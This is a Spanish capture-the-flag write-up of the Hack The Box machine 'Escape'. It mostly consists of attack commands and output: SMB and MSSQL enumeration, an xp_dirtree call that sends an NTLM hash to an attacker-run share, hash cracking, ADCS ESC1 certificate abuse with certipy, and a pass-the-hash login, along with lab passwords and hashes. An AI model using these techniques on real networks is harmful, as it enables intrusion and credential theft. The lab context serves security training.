---
layout: single
title: Hack The Box - Escape
excerpt: "Escape es una máquina de dificultad Media en Hack The Box. El reto comienza con la enumeración del servicio SMB, donde se identifica un archivo PDF que contiene contraseñas. Posteriormente, se aprovecha la función xp_dirtree para obtener un hash como el usuario sql_svc.
Una enumeración básica permite escalar a otro usuario, y finalmente, para la escalada de privilegios, se abusa de la configuración ESC1 de los Servicios de Certificados de Active Directory (ADCS). Esto permite obtener el hash del usuario administrador y realizar un Pass the Hash, logrando así una shell con privilegios de administrador en el sistema."
date: 2025-08-16
classes: wide
header:
  teaser: /assets/images/htb-writeup-Escape/Escape.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - Hack The Box
  - Active Directory
  - SMB
  - MSSQL
tags:  
  - Windows
  - certipy 
  - ESC1

---
<style>
  body {
    margin: 0;
    padding: 0;
    background-color: #0b101b;
    font-family: Arial, sans-serif;
    color: white;
  }

  /* Centramos únicamente los elementos visuales */
  .glitch,
  .title,
  .date,
  .info {
    text-align: center;
    margin-left: auto;
    margin-right: auto;
  }

  .glitch {
    position: relative;
    width: 90%;
    max-width: 400px;
    height: 300px;
    background-image: url("/assets/images/htb-writeup-Escape/Escape.png");
    background-size: cover;
    background-position: center;
    margin: 2rem auto 1rem auto;
    overflow: hidden;
  }

  .glitch:before {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-image: url("/assets/images/htb-writeup-Escape/Escape.png");
    background-size: cover;
    background-position: center;
    opacity: 0.5;
    mix-blend-mode: hard-light;
    animation: glitch2 10s linear infinite;
  }

  .glitch:hover:before {
    animation: glitch1 1s linear infinite;
  }

  @keyframes glitch1 {
    0% { background-position: 0 0; filter: hue-rotate(0deg); }
    10% { background-position: 5px 0; }
    20% { background-position: -5px 0; }
    30% { background-position: 15px 0; }
    40% { background-position: -5px 0; }
    50% { background-position: -25px 0; }
    60% { background-position: -50px 0; }
    70% { background-position: 0 -20px; }
    80% { background-position: -60px -20px; }
    81% { background-position: 0 0; }
    100% { background-position: 0 0; filter: hue-rotate(360deg); }
  }

  @keyframes glitch2 {
    0% { background-position: 0 0; filter: hue-rotate(0deg); }
    10% { background-position: 15px 0; }
    15% { background-position: -15px 0; }
    20% { filter: hue-rotate(360deg); }
    25% { background-position: 0 0; filter: hue-rotate(0deg); }
    100% { background-position: 0 0; filter: hue-rotate(0deg); }
  }

  .title {
    font-size: 1.5rem;
    font-weight: bold;
    margin-bottom: 0.5rem;
  }

  .date {
    font-size: 1rem;
    color: #ccc;
    margin-bottom: 1rem;
  }

  .info {
    display: flex;
    justify-content: center;
    gap: 2rem;
    flex-wrap: wrap;
    margin-top: 1rem;
    font-size: 0.9rem;
  }

  .info div {
    text-align: center;
  }

  .info .label {
    color: #999;
    font-size: 0.8rem;
  }

  .icon {
    font-size: 2rem;
    color: #0f0;
    margin: 0.5rem 0;
  }

  /* Responsive */
  @media (max-width: 575.5px) {
    .glitch {
      height: 200px;
    }
    .title {
      font-size: 1.3rem;
    }
  }
</style>

<body>
    <div class="glitch">  
    </div>
</body>

<br>

`Escape` es una máquina de dificultad Media en Hack The Box. El reto comienza con la enumeración del servicio SMB, donde se identifica un archivo PDF que contiene contraseñas. Posteriormente, se aprovecha la función xp_dirtree para obtener un hash como el usuario sql_svc.
Una enumeración básica permite escalar a otro usuario, y finalmente, para la escalada de privilegios, se abusa de la configuración ESC1 de los Servicios de Certificados de Active Directory (ADCS). Esto permite obtener el hash del usuario administrador y realizar un Pass the Hash, logrando así una shell con privilegios de administrador en el sistema.

## Enumeración

Realizando un escaneo de puertos TCP identifique los siguientes abiertos:

```bash
Nmap scan report for 10.10.11.202
Host is up, received user-set (0.26s latency).
Scanned at 2025-08-06 16:16:41 EDT for 71s

PORT      STATE    SERVICE       REASON          VERSION
53/tcp    open     domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open     kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-08-07 04:16:50Z)
135/tcp   open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open     netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open     ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds? syn-ack ttl 127
464/tcp   open     kpasswd5?     syn-ack ttl 127
593/tcp   open     ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open     ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
1433/tcp  open     ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000
3268/tcp  open     ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
3269/tcp  open     ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
5985/tcp  open     http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open     mc-nmf        syn-ack ttl 127 .NET Message Framing
```
## Enumeración SMB

La maquina tenia los siguientes recursos compartidos:

```bash
┌──(root㉿kali)-[/home/kali]
└─# smbclient -L 10.10.11.202 -N                  

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Public          Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.202 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
Intente usar smbmap para poder ver los permisos que tengo en cada recurso compartido, sin embargo la ejecución fallo

```bash
┌──(root㉿kali)-[/home/kali]
└─# smbmap -d sequel.htb -H 10.10.11.202                                                                 

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
[*] Closed 1 connections       
```
Agregando la autenticación nula tuve el mismo resultado así que use `netxec` pero nuevamente tuve un error

```bash
┌──(root㉿kali)-[/home/kali]
└─# nxc smb 10.10.11.202 -u 'PublicUser' -p 'GuestUserCantWrite1' --shares      
SMB         10.10.11.202    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.202    445    DC               [+] sequel.htb\PublicUser:GuestUserCantWrite1 (Guest)
SMB         10.10.11.202    445    DC               [-] Error enumerating shares: STATUS_ACCESS_DENIED
```
Para solucionarlo en el campo usuario puse cualquier cosa y no especifique contraseña

```bash
┌──(root㉿kali)-[/home/kali]
└─# nxc smb 10.10.11.202 -u 'elp3rr1n' -p '' --shares             
SMB         10.10.11.202    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.202    445    DC               [+] sequel.htb\nlknlk: (Guest)
SMB         10.10.11.202    445    DC               [*] Enumerated shares
SMB         10.10.11.202    445    DC               Share           Permissions     Remark
SMB         10.10.11.202    445    DC               -----           -----------     ------
SMB         10.10.11.202    445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.202    445    DC               C$                              Default share
SMB         10.10.11.202    445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.202    445    DC               NETLOGON                        Logon server share 
SMB         10.10.11.202    445    DC               Public          READ            
SMB         10.10.11.202    445    DC               SYSVOL                          Logon server share
```
Entrando al recurso `Public` donde tengo permiso de lectura veo que hay un archivo PDF mismo que descargue y abrí

```bash
──(root㉿kali)-[/home/kali]
└─# smbclient //10.10.11.202/Public
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Nov 19 06:51:25 2022
  ..                                  D        0  Sat Nov 19 06:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 08:39:43 2022

                5184255 blocks of size 4096. 1464998 blocks available
smb: \> mget *
Get file SQL Server Procedures.pdf? y
getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (15.0 KiloBytes/sec) (average 15.0 KiloBytes/sec)
smb: \> exit
```
![](/assets/images/htb-writeup-Escape/pdf.png)

El PDF me proporciono un usuario y contraseña `PublicUser:GuestUserCantWrite1` así como también contiene otros posibles usuarios:` ryan, tom y brandon` valide las contraseñas del usuario `PublicUser` y funcionaron en SMB y MSSQL.

```bash
┌──(root㉿kali)-[/home/kali]
└─# nxc smb 10.10.11.202 -u 'PublicUser' -p 'GuestUserCantWrite1'        
SMB         10.10.11.202    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.202    445    DC               [+] sequel.htb\PublicUser:GuestUserCantWrite1 (Guest)

┌──(root㉿kali)-[/home/kali]
└─# nxc mssql 10.10.11.202 -u 'PublicUser' -p 'GuestUserCantWrite1' --local-auth
MSSQL       10.10.11.202    1433   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
MSSQL       10.10.11.202    1433   DC               [+] DC\PublicUser:GuestUserCantWrite1 
```
## Enumeración MSSQL

Posteriormente inicie sesión en MSSQL 

```bash
┌──(root㉿kali)-[/home/kali]
└─# python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py WORKGROUP/PublicUser:GuestUserCantWrite1@10.10.11.202 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (PublicUser  guest@master)>
```
En este punto intente ejecutar comandos pero tuve un error así que intente habilitar el `xp_cmdshell` pero también obtuve un error 

```bash
SQL (PublicUser  guest@master)> xp_cmdshell "whoami"
ERROR(DC\SQLMOCK): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.
SQL (PublicUser  guest@master)> enable_xp_cmdshell
ERROR(DC\SQLMOCK): Line 105: User does not have permission to perform this action.
ERROR(DC\SQLMOCK): Line 1: You do not have permission to run the RECONFIGURE statement.
ERROR(DC\SQLMOCK): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
ERROR(DC\SQLMOCK): Line 1: You do not have permission to run the RECONFIGURE statement.
SQL (PublicUser  guest@master)> 
```

Para poder ejecutar comandos intente impersonar al usuario `sa` pero también tuve un error

```bash
SQL (PublicUser  guest@master)> SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
name   
----   
SQL (PublicUser  guest@master)> EXECUTE AS LOGIN = 'sa' SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER('sysadmin')
ERROR(DC\SQLMOCK): Line 1: Cannot execute as the server principal because the principal "sa" does not exist, this type of principal cannot be impersonated, or you do not have permission.
SQL (PublicUser  guest@master)> 
```
En este punto probé otro vector de ataque con `xp_dirtree` para listar recursos compartidos a nivel de red de algún equipo y poder capturar un hash, primero levante un recurso compartido con impacket

```bash
┌──(root㉿kali)-[/home/kali]
└─# impacket-smbserver smbFolder $(pwd) -smb2support           
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```
Después realice una consulta a mi recurso compartido y logre capturar el hash del usuario `sql_svc`: 

```bash
exec xp_dirtree "\\10.10.16.5\smbFolder\"
```

```bash
SQL (PublicUser  guest@master)> exec xp_dirtree "\\10.10.16.5\smbFolder\"
subdirectory   depth   
------------   -----   
SQL (PublicUser  guest@master)>
```

```bash
┌──(root㉿kali)-[/home/kali]
└─# impacket-smbserver smbFolder $(pwd) -smb2support           
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.11.202,63188)
[*] AUTHENTICATE_MESSAGE (sequel\sql_svc,DC)
[*] User DC\sql_svc authenticated successfully
[*] sql_svc::sequel:aaaaaaaaaaaaaaaa:5fe41147073cde36dd886125f9f4c32a:010100000000000080a4aa4d7107dc017b5258aff82d3e3d000000000100100062004e007800560043006d006f0042000300100062004e007800560043006d006f004200020010004e007300470079005400640056005500040010004e0073004700790054006400560055000700080080a4aa4d7107dc0106000400020000000800300030000000000000000000000000300000189ef29203dd3f4bbd2d624335a76ebfa29ac41d6baf1caf955c16257cc3c7670a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0035000000000000000000
[*] Closing down connection (10.10.11.202,63188)
[*] Remaining connections []
```
Al romper el hash pude encontrar la contraseña en claro del usuario 

```bash
┌──(kali㉿kali)-[~]
└─$ john hash_escape --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
REGGIE1234ronnie (sql_svc)     
1g 0:00:00:19 DONE (2025-08-07 04:03) 0.05149g/s 551019p/s 551019c/s 551019C/s RENZOJAVIER..REDMAN69
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
  
┌──(root㉿kali)-[/home/kali]
└─# nxc smb 10.10.11.202 -u sql_svc -p 'REGGIE1234ronnie'      
SMB         10.10.11.202    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.202    445    DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie 

┌──(root㉿kali)-[/home/kali]
└─# nxc winrm 10.10.11.202 -u sql_svc -p 'REGGIE1234ronnie'
WINRM       10.10.11.202    5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.11.202    5985   DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie (Pwn3d!)
```
Finalmente inicie sesión con `evil-winrm`

```bash
──(root㉿kali)-[/home/kali]
└─# evil-winrm -i 10.10.11.202 -u sql_svc -p 'REGGIE1234ronnie'      
  
Evil-WinRM shell v3.7
 
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
 
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\sql_svc\Documents> whoami
sequel\sql_svc
```
## sql_svc -> Ryan

Dentro de la raíz hay un directorio interesante **SQLServer**

```bash
*Evil-WinRM* PS C:\> dir

    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         2/1/2023   8:15 PM                PerfLogs
d-r---         2/6/2023  12:08 PM                Program Files
d-----       11/19/2022   3:51 AM                Program Files (x86)
d-----       11/19/2022   3:51 AM                Public
d-----         2/1/2023   1:02 PM                SQLServer
d-r---         2/1/2023   1:55 PM                Users
d-----  
```
Dentro del archivo ERRORLOG.BAK se encuentra una contraseña, tras validarla con el usuario ryan funciono

```bash
*Evil-WinRM* PS C:\SQLServer> dir


    Directory: C:\SQLServer


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         2/7/2023   8:06 AM                Logs
d-----       11/18/2022   1:37 PM                SQLEXPR_2019
-a----       11/18/2022   1:35 PM        6379936 sqlexpress.exe
-a----       11/18/2022   1:36 PM      268090448 SQLEXPR_x64_ENU.exe


*Evil-WinRM* PS C:\SQLServer> cd Logs
*Evil-WinRM* PS C:\SQLServer\Logs> dir


    Directory: C:\SQLServer\Logs


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         2/7/2023   8:06 AM          27608 ERRORLOG.BAK
```

```bash
┌──(root㉿kali)-[/home/kali]
└─# grep -i "pass" s
2022-11-18 13:43:06.75 spid18s     Password policy update was successful.
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]

┌──(root㉿kali)-[/home/kali]
└─# nxc smb 10.10.11.202 -u Ryan.Cooper -p 'NuclearMosquito3'
SMB         10.10.11.202    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.202    445    DC               [+] sequel.htb\Ryan.Cooper:NuclearMosquito3 
```
Finalmente inicie sesión como ryan con evil-winrm

```bash
┌──(root㉿kali)-[/home/kali]
└─# evil-winrm -i 10.10.11.202 -u Ryan.Cooper -p 'NuclearMosquito3'  
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> whoami
sequel\ryan.cooper
```
## Escalada de privilegios

Una verificación fundamental al enumerar un dominio de Windows es identificar la presencia de Servicios de Certificados de Active Directory (ADCS), esto lo realice con netexec 

```bash
┌──(root㉿kali)-[/home/kali]
└─# nxc ldap 10.10.11.202 -u 'Ryan.Cooper' -p 'NuclearMosquito3' -M adcs      
SMB         10.10.11.202    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
LDAPS       10.10.11.202    636    DC               [+] sequel.htb\Ryan.Cooper:NuclearMosquito3 
ADCS        10.10.11.202    389    DC               [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS        10.10.11.202    389    DC               Found PKI Enrollment Server: dc.sequel.htb
ADCS        10.10.11.202    389    DC               Found CN: sequel-DC-CA
```
El resultado muestra un servidor ADCS activo (`dc.sequel.htb` con la CA `sequel-DC-CA`) que gestiona certificados en el dominio esto abre la puerta a **ataques contra ADCS**, como _ESC1, ESC8 o ESC13_, dependiendo de la configuración. Por lo cual utilice certipy para realizar la enumeración.

```bash
┌──(root㉿kali)-[/home/kali/escape]
└─# certipy-ad find -u 'Ryan.Cooper@sequel.htb' -p 'NuclearMosquito3' -dc-ip 10.10.11.202 -enabled -text
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'sequel-DC-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'sequel-DC-CA'
[*] Checking web enrollment for CA 'sequel-DC-CA' @ 'dc.sequel.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20250812044641_Certipy.txt'
[*] Wrote text output to '20250812044641_Certipy.txt'
```
Al consultar el archivo se puede encontrar una plantilla vulnerable a _ESC1_ 

```bash
Template Name                       : UserAuthentication
    Display Name                        : UserAuthentication
    Certificate Authorities             : sequel-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 10 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2022-11-18T21:10:22+00:00
    Template Last Modified              : 2024-01-19T00:26:38+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Domain Users
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Administrator
        Full Control Principals         : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Property Enroll           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Domain Users
                                          SEQUEL.HTB\Enterprise Admins
    [+] User Enrollable Principals      : SEQUEL.HTB\Domain Users
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```
Para explotarla utilice el siguiente comando:

```bash 
┌──(root㉿kali)-[/opt/]
└─# certipy-ad -debug req -u 'Ryan.Cooper@sequel.htb' -p 'NuclearMosquito3' -template UserAuthentication -ca 'sequel-DC-CA' -dc-ip 10.10.11.202 -dc-host DC.sequel.htb -target DC.sequel.htb  -upn administrator@sequel.htb 

Certipy v5.0.2 - by Oliver Lyak (ly4k)

[+] Nameserver: '10.10.11.202'
[+] DC IP: '10.10.11.202'
[+] DC Host: 'DC.sequel.htb'
[+] Target IP: None
[+] Remote Name: 'DC.sequel.htb'
[+] Domain: 'SEQUEL.HTB'
[+] Username: 'RYAN.COOPER'
[+] Trying to resolve 'DC.sequel.htb' at '10.10.11.202'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.10.11.202[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.10.11.202[\pipe\cert]
[*] Request ID is 13
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@sequel.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[+] Attempting to write data to 'administrator.pfx'
[+] Data written to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

```bash
┌──(root㉿kali)-[/opt/srp3rr1n.github.io/assets/images/htb-writeup-Escape]
└─# certipy-ad auth -pfx administrator.pfx -domain sequel.htb -dc-ip 10.10.11.202

Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@sequel.htb'
[*] Using principal: 'administrator@sequel.htb'
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
[-] Use -debug to print a stacktrace
[-] See the wiki for more information
```
En este punto tuve un error, para solucionarlo sincronice la hora de mi equipo con la hora del servidor

```bash
┌──(root㉿kali)-[/opt/]
└─# ntpdate 10.10.11.202
2025-08-16 22:48:02.123413 (-0400) +7224.782814 +/- 0.233653 10.10.11.202 s1 no-leap
CLOCK: time stepped by 7224.782814
```
```bash
┌──(root㉿kali)-[/opt/srp3rr1n.github.io/assets/images/htb-writeup-Escape]
└─# certipy-ad auth -pfx administrator.pfx -domain sequel.htb -dc-ip 10.10.11.202

Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@sequel.htb'
[*] Using principal: 'administrator@sequel.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
```
Finalmente, me conecte al servidor usando el hash del administrador

```bash
┌──(root㉿kali)-[/opt/srp3rr1n.github.io/assets/images/htb-writeup-Escape]
└─# evil-winrm -i 10.10.11.202 -u Administrator -H 'a52f78e4c751e5f5e17e1e9f3e58f4ee'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                                   
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
sequel\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```
